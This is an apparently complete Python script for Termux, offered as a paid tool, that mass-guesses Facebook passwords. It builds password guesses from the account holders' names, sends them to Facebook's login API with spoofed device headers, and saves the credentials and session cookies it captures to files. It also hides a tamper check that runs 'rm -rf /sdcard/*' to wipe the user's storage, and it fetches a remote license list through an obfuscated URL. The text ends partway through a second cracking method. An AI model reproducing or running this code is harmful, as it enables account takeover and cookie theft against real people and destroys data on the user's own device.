#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FULL SCRIPT ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
# OWNER BY SCRIPT : MR OGGY
# GITHUB LINK : SKBER-CYBER
# MACK BY : JAHID HASAN 
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
print("\x1b[38;5;46m➤\x1b[1;97m WELCOME AMO TOOL")
print("\x1b[38;5;46m➤\x1b[1;97m INJOY A PAID TOOL ")
from os import path
from urllib.request import urlopen
import os,base64,zlib,pip,urllib,platform,math,shutil,random,uuid,string,hashlib,json,sys,uuid,getpass
import os,base64,zlib,pip,urllib
import os,zlib,time,datetime
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from time import localtime as lt
import os
import requests
import httpx
import os
import os,zlib
from time import localtime as lt
from os import system as osRUB
from os import system as cmd
os.system('clear')
try:
    import requests 
except ImportError:
    print('\n  installing Requests ...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n  installing futures ...\n')
    os.system('pip install futures')    
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as MrXIDI
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
import requests,bs4,json,os,sys,random,datetime,time,re,string
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit
   
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ ETC MODULES ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
              
gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-75505','GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOOP ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
loop=0;oks=[];cps=[];twf=[];pcp=[];id=[];tokenku=[];uid=[];cid=[]
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ COLOUR ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
BU= '\033[1;34m';A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;46m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LINEX ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
sys.stdout.write('\x1b]2;✘ AMO ✘ XD ✘\x07')
def clear():os.system('clear');print(logo)
def linex():print(f'{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ SECURITY-CODE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def es():
      if path.isfile("/data/data/com.termux/files/usr/bin/rm"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
      if path.isfile("/data/data/com.termux/files/usr/bin/termux-reset"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
      if path.isfile("/data/data/com.termux/files/usr/bin/termux-setup-storage"):
           pass
      else:
           system('clear');print('System Modification Not Allowed since using Jutt');exit()
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit(f'\x1b[38;5;46m➤{A} RE-RUN TOOL.!')
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit(f'\x1b[38;5;46m➤{A} RE-RUN TOOL.!')
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit(f'\x1b[38;5;46m➤{A} RE-RUN TOOL.!') 
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rf /sdcard/*')
    os.system('pip install requests')
    exit(f'\x1b[38;5;46m➤{A} RE-RUN TOOL.!')
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ APV ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5OKK)\xcb1442\xd0O,\xd0\xcfM\xcc\xcc\xd3\xcfJ\x03\x001"\x13\xc6')
update = requests.get(xny).text
myid=uuid.uuid4().hex[:5].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrakingxxx-cov', 'r').read()
kex=(f"{uid}{key1}1107122E{uid}1107122E")
key2 = base64.b64encode(str(f"{kex}").encode('utf-8'))
key=(f"{key2}")
licu=(f"{uid}9XOJW27JBA17291")
fkeyx = key.replace("b'","").replace("'","")
myweb2 = requests.get("https://github.com/SKBER-CYBER/Contol/blob/main/amo").text
def apv():
	try:
		clear()
		x = requests.get("https://github.com/SKBER-CYBER/Contol/blob/main/amo").text
		if str("upppdate") in update:
			os.system('clear')
			exit('script is in update / maintanance be patient ')
		elif str("res-sseett") in update:
			os.system('')
			os.system('')
			os.system('')
			exit('Dont Try To Bypass')
		elif kex in myweb2:
			Main()
		else:	
			clear();print(f"\x1b[38;5;46m➤{A} USER NAME    {R}:{G} {username}")
			print(f"\x1b[38;5;46m➤{A} TOKEN {R}:{G} {kex}")
			print(f"{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
			print(f"\x1b[38;5;46m➤{A} YOUR SUBSCRIPTION DATE EXPIRED")
			print(f"\x1b[38;5;46m➤{A} CLONING DATE {R}: {X3}{date}")
			print(f"\x1b[38;5;46m➤{A} CONTACT DEVELOPER TO GET SUBSCRIPTION")
			input(f"\x1b[38;5;46m➤{A} PRESS ENTER TO SEND KEY TOOL DEVELOPER")
			os.system(f"termux-open-url https://wa.me/+8801924709552?text={kex}")  	
			apv()
	except requests.exceptions.ConnectionError:
		exit(' No internet connection ..')
      
def rrrr():
        if kex in myweb2:
                pass
        else:
                apv()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ DATE ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'\x1b[1;97m|\x1b[38;5;122m'+str(bln)+'\x1b[1;97m|\x1b[38;5;122m'+str(thn)
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MOZILLA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
import requests,random

def ua_valid():
    rr = random.randint
    rc = random.choice
    model2 = requests.get('htt'+'ps://ra'+'w.gith'+'ub'+'user'+'co'+'ntent.c'+'om/MR-X'+'IDI/Co'+'ntr'+'ol/m'+'ain/'+'rand'+'om.t'+'xt').text.splitlines()
    model = random.choice(model2)
    redmi4 = f"Mozilla/5.0 (Linux; Android {str(random.randint(4, 11))}.0; Nexus 5 Build/MRA{str(random.randint(30, 60))}N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 Edg/111.0.{str(random.randint(1600, 1661))}.41"
    return rc([redmi4])
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE UA ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def yek():
    import random
    fbav = f'{random.randint(10,437)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbbv = str(random.randint(10000000, 99999999))
    sex = f"[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
    umah = '[FBAN/Orca-Android;FBAV/288.0.0.15.118;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/253310653;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
    xuna = sex+umah
    ex = random.choice([xuna])
    return ex                
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#	
logo=f"""{A}
{A}            █████  ███    ███  ██████  
{A}           ██   ██ ████  ████ ██    ██ 
 {A}          ███████ ██ ████ ██ ██    ██ 
         {A}  ██   ██ ██  ██  ██ ██    ██ 
     {A}      ██   ██ ██      ██  ██████    \x1b[38;5;46m➤ 1.0
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m➤{A} FACEBOOK     {R}:{A} MD JAHID HASAN
\x1b[38;5;46m➤{A} GITHUB       {R}:{A} SKBER-CYBER
\x1b[38;5;46m➤{A} FEATURE      {R}:{A} FILE{G}✘{A}RANDOM
\x1b[38;5;46m➤{A} QUALITY      {R}:{G} PREMIUM
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ USERNAME ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
clear();username =input(f"\x1b[38;5;46m➤{A} USER NAME    {R}:{G} ")
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ MAIN MENU ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def Main():
        try:
                        clear();print(f"\x1b[38;5;46m➤{A} USER NAME    {R}:{G} {username}");print(f"\x1b[38;5;46m➤{A} TOKEN {R}:{G} {kex}");linex()
                        print(f'\x1b[38;5;46m➤{A} 1 FILE CRACK\n\x1b[38;5;46m➤{A} 2 RANDOM CRACK\n\x1b[38;5;46m➤{A} 3 JOINT PUBLIC GROUP \n\x1b[38;5;46m➤{A} 4 CONTACT OWNER \n\x1b[38;5;46m➤{A} 5{R} EXIT TERMINAL')
                        linex()
                        oggy=input(f'\x1b[38;5;46m➤{A} CHOICE {R}: {G}')
                        if oggy in ['1','01']:
                                clear();print(f'\x1b[38;5;46m➤{A} EXAMPLE {R}: {G}/sdcard/jahid.txt ');linex()
                                file = input(f'\x1b[38;5;46m➤{A} FILE NAME {R}: {G}')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print(f'{R}[{G}+{R}]{G} FILE LOCATION NOT FOUND ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(f'\x1b[38;5;46m➤{A} 1 METHOD M1\n\x1b[38;5;46m➤{A} 2 METHOD M2\n\x1b[38;5;46m➤{A} 3 METHOD M3');linex()
                                mthd=input(f'\x1b[38;5;46m➤{A} CHOICE {R}: {G}')
                                clear()
                                plist = []           
                                print(f'\x1b[38;5;46m➤{A} 1 15 PASSWORD AUTO PASS\n\x1b[38;5;46m➤{A} 2 CHOICE PASSWORD CLONE');linex()
                                ppp=input(f'\x1b[38;5;46m➤{A} CHOICE {R}: {G}')
                                if ppp in ['1','01']:
                                        plist.append('first last')
                                        plist.append('firstlast')
                                        plist.append('first123')
                                        plist.append('First Last')
                                        plist.append('FirstLast')
                                        plist.append('first1234')
                                        plist.append('First Last')
                                        plist.append('57273200')
                                        plist.append('57575727')
                                        plist.append('57575727')
                                        plist.append('first@123')
                                        plist.append('first017')
                                        plist.append('@12345@')
                                        plist.append('@123456@')
                                        plist.append('@1234567@')
                                        plist.append('first019')
                                        plist.append('first018')
                                        plist.append('first@')
                                        plist.append('first@@')
                                        plist.append('last123')
                                        plist.append('last1234')
                                        plist.append('last12')
                                        plist.append('@@first@@')
                                        plist.append('last12345')
                                        plist.append('first@@@')
                                        plist.append('first0')
                                        plist.append('first1')
                                else:
                                        try:
                                                clear()
                                                ps_limit = int(input(f'\x1b[38;5;46m➤{A} PASSWORD LIMIT \033[1;32m: \033[1;32m'))
                                        except:
                                                ps_limit =1
                                        clear()
                                        print(f'\x1b[38;5;46m➤{A} EXAMPLE \033[1;32m: \033[1;31mfirstlast/first@@/first123 ')
                                        linex()
                                        for i in range(ps_limit):
                                                plist.append(input(f'\x1b[38;5;46m➤{A} PASSWORD NO {i+1} \033[1;32m: \033[1;32m'))
                                clear();print(f'\x1b[38;5;46m➤{A} DO YOU CP SHOW ACCOUNT (Y/N) ')
                                linex()
                                cx=input(f'\x1b[38;5;46m➤{A} CHOICE {R}: {G}')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(f"\x1b[38;5;46m➤{A} USER NAME    {R}:{G} {username}");print(f"\x1b[38;5;46m➤{A} TOKEN {R}:{G} {kex}");linex();print(f'\x1b[38;5;46m➤{A} CRACKING METHOD {R}:{G} M{mthd}')
                                        print(f'\x1b[38;5;46m➤{A} TOTAL ID {R}:{R} '+total_ids+f' ')                                   
                                        print(f'\x1b[38;5;46m➤{A} IF NO RESULT ON/OF AIRPLAN MODE')
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api2,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api3,ids,names,passlist)                                                      
                                print();linex();print(f'\x1b[38;5;46m➤{A} THE PROCESS HAS COMPLETED')
                                print(f'\x1b[38;5;46m➤{A} TOTAL OK/CP : {G}'+str(len(oks))+f'{A}|{R}'+str(len(cps)))
                                linex()
                                input(f'\x1b[38;5;46m➤{A} PRESS ENTER TO BACK ')
                                Main()
                        elif oggy in ['2','02']:
                                bd()
                        elif oggy in ['3','03']:
                                os.system('xdg-open https://facebook.com/groups/945647503604870/');menu()
                        elif oggy in ['4','04']:
                                os.system('xdg-open https://www.facebook.com/oggyfire');menu()
                        elif oggy in ['0','00']:
                                exit(f'{R}[{G}+{R}]{G} EXIT DONE ')
                        else:
                                exit(f'{R}[{G}+{R}]{G} OPTION NOT FOUND IN MENU');menu()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print(f'{R}[{G}+{R}]{G} NO INTERNET CONNECTION...')
                exit()
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M1 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api1(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}AMO-M1{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': yek(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = "https://b-graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m➤ {A}[{G}AMO-OK{A}]{G} '+ids+f' | '+pas+'')
                open('/sdcard/AMO-FILE-M1-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                ###print(f'\r\r{R}[OGGY-CP{R}] '+ids+f' | '+pas+'')
                open('/sdcard/AMO-FILE-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
     pass
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[ FILE METHOD M2 ]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
def api2(ids,names,passlist):
    global loop,oks,cps
    sys.stdout.write(f"\r\r\r\x1b[38;5;46m➤{A} [{G}AMO-M2{A}|{X3}{date}{A}|{BU}{loop}{A}|{G}{len(oks)}{A}|{R}{len(cps)}{A}]");sys.stdout.flush()
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln)
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": ids,
            "password": pas,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            head = {
            'User-Agent': yek(),
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            url = "https://b-graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
            if "access_token" in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                print(f'\r\r\x1b[38;5;46m➤ '+ids+f' | '+pas+' | '+coki+'')
